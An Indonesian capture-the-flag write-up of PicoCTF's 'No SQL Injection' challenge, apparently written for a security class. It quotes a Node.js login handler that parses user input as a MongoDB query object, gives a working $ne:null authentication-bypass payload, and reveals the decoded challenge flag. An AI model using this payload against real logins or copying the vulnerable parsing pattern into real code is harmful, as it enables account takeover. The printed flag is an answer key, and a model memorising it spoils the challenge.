# Writeup PicoCTF: No SQL Injection

[Akses Challenge disini](https://play.picoctf.org/practice/challenge/443?page=1&search=sql)

Di tantangan ini, kita diberikan sebuah website dengan halaman login. Tugas kita adalah mencoba masuk (login) untuk mendapatkan flag-nya, tapi tentu saja kita tidak tahu email dan password-nya.

![pico-no-sql](https://github.com/bielnzar/Kelas-KWA-2025/blob/main/week2-injection/mandiri/images/no-sql-inj/1.png)

## Overview

- **Nama Challenge**: No SQL Injection

## Menemukan Celah

Setelah mengunduh dan melihat source code yang diberikan, kita bisa menemukan celah keamanan pada bagian `server.js`, tepatnya di kode yang menangani proses login:

```javascript
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  try {
    const user = await User.findOne({
      email:
        email.startsWith("{") && email.endsWith("}")
          ? JSON.parse(email)
          : email,
      password:
        password.startsWith("{") && password.endsWith("}")
          ? JSON.parse(password)
          : password,
    });
```

**Masalah Utama**

Masalah utamanya ada pada baris `JSON.parse(email)` dan `JSON.parse(password)`. Kode ini memeriksa apakah input dari pengguna diawali dengan `{` dan diakhiri dengan `}`. Jika iya, server akan menganggapnya sebagai objek JSON dan langsung menggunakannya untuk mencari data di database MongoDB.

## Langkah Eksploitasi

### 1. Payload

```json
{
  "email": "{\"$ne\": null}",
  "password": "{\"$ne\": null}"
}
```

**Apa arti payload di atas?**
- `"$ne"` adalah operator MongoDB yang artinya *"Not Equal"* (tidak sama dengan).
- `{\"$ne\": null}` berarti "cari data apapun yang nilainya **tidak kosong**".

### 2. Mengirim Payload

Kita bisa menggunakan `curl` di terminal atau burpsuite untuk mengirim payload ini ke server.

![SQLI-2](https://github.com/bielnzar/Kelas-KWA-2025/blob/main/week2-injection/mandiri/images/no-sql-inj/2.png)

### 3. Mendapatkan Flag

Jika berhasil, server akan merespons dengan data user admin, termasuk sebuah `token`:

```json
{
  "success": true,
  "email": "admin@picoctf.org",
  "token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==",
  "firstName": "admin",
  "lastName": "user"
}
```

`token` tersebut di-encode menggunakan Base64. Untuk mendapatkan flag-nya, kita perlu men-decode token tersebut.

Bisa menggunakan tool online atau perintah di terminal:

```bash
echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==" | base64 -d
```

![Decode](https://github.com/bielnzar/Kelas-KWA-2025/blob/main/week2-injection/mandiri/images/no-sql-inj/3.png)

Setelah di-decode, kita akan mendapatkan flag-nya:

> `picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}`